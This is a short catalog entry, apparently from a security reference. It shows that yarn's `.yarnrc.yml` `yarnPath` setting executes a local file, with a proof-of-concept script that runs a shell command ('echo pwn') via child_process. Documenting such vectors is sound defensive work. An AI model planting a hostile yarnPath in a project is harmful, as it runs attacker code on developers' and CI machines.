---
title: yarn
tags:
  - config-file
  - eval-js
references: 
- https://yarnpkg.com/configuration/yarnrc
files: [.yarnrc.yml]
---

`yarn` manages dependencies for JavaScript projects. It can be controlled using `.yarnrc.yml`. Setting `yarnPath` will execute a local file.

```yaml
yarnPath: "./poc.js"
```

```js
require('child_process').exec("echo pwn");
```
